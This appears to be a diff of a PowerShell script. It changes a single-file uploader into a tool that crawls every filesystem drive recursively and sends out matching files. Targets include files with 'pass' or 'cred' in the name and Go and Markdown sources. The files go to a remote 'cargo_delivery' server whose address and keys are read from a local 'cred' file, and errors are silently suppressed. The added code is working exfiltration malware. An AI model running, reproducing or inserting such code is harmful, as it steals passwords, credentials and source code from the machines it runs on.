@@ -1,27 +1,75 @@
-# Define variables for the cargo delivery endpoint and file path
-$endpoint = "http://192.168.10.62:5000/cargo_delivery"  # Replace with your actual server endpoint
-$fileToUpload = "Preparer.ps1"  # Replace with the path to your file
+# Path to the credentials JSON file
+$credFilePath = "cred"
 
-# Define parameters required for cargo delivery
-$espID = "your_esp_id"
-$deliveryKey = "your_delivery_key"
-$encryptionPassword = "your_encryption_password"
+# Function to read and parse JSON credentials
+function Get-Credentials {
+    param (
+        [string]$filePath
+    )
 
-# Create hashtable for form data
-$formData = @{
-    esp_id = $espID
-    delivery_key = $deliveryKey
-    encryption_password = $encryptionPassword
-    file = Get-Item $fileToUpload
+    $jsonContent = Get-Content -Path $filePath -Raw | ConvertFrom-Json
+    return $jsonContent
 }
 
-# Send file to cargo delivery endpoint using Invoke-RestMethod
-try {
-    $response = Invoke-RestMethod -Uri $endpoint -Method Post -Form $formData -TimeoutSec 60
+# Read credentials from JSON file
+$creds = Get-Credentials -filePath $credFilePath
 
-    # Output response from server
-    Write-Host "Server response: $($response.message)"
+# Extract credentials
+$espID = $creds.esp_id
+$deliveryKey = $creds.delivery_key
+$encryptionPassword = $creds.encryption_password
+$url = "http://$($creds.URL):$($creds.Port)/cargo_delivery"
+
+# Function to search for files
+function Search-Files {
+    param (
+        [string]$rootDir,
+        [string[]]$patterns
+    )
+
+    $files = @()
+    foreach ($pattern in $patterns) {
+        $files += Get-ChildItem -Path $rootDir -Recurse -Include *$pattern* -ErrorAction SilentlyContinue
+    }
+
+    return $files
 }
-catch {
-    Write-Host "Error occurred: $_"
+
+# Function to upload a file
+function Upload-File {
+    param (
+        [string]$filePath
+    )
+
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+
+    $form = @{
+        "esp_id" = $espID
+        "delivery_key" = $deliveryKey
+        "encryption_password" = $encryptionPassword
+        "file" = Get-Item -Path $filePath
+    }
+
+    try {
+        $response = Invoke-RestMethod -Uri $url -Method Post -Form $form
+        Write-Output "File uploaded successfully: $filePath"
+    } catch {
+        Write-Output "Error uploading file: $filePath"
+        Write-Output $_.Exception.Message
+    }
+}
+
+# Get all drives
+$drives = Get-PSDrive -PSProvider FileSystem
+
+# Search for files and upload them
+foreach ($drive in $drives) {
+    $driveRoot = $drive.Root
+    Write-Output "Searching in drive: $driveRoot"
+
+    $files = Search-Files -rootDir $driveRoot -patterns @(".go", ".md", "pass", "cred")
+
+    foreach ($file in $files) {
+        Upload-File -filePath $file.FullName
+    }
 }
